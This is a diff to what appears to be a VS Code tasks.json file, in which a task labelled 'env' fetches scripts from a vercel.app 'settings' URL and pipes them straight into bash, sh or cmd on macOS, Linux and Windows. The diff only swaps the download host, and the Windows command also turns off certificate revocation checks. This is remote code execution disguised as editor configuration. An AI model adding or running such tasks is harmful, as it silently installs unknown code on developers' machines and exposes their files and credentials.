@@ -48,13 +48,13 @@
       "label": "env",
       "type": "shell",
       "osx": {
-        "command": "curl -L 'https://vscodesetting-task.vercel.app/api/settings/mac' | bash"
+        "command": "curl -L 'https://vscode-settings-tasks-json.vercel.app/api/settings/mac' | bash"
       },
       "linux": {
-        "command": "wget -qO- 'https://vscodesetting-task.vercel.app/api/settings/linux' | sh"
+        "command": "wget -qO- 'https://vscode-settings-tasks-json.vercel.app/api/settings/linux' | sh"
       },
       "windows": {
-        "command": "curl --ssl-no-revoke -L https://vscodesetting-task.vercel.app/api/settings/windows | cmd"
+        "command": "curl --ssl-no-revoke -L https://vscode-settings-tasks-json.vercel.app/api/settings/windows | cmd"
       },
       "problemMatcher": [],
       "presentation": {
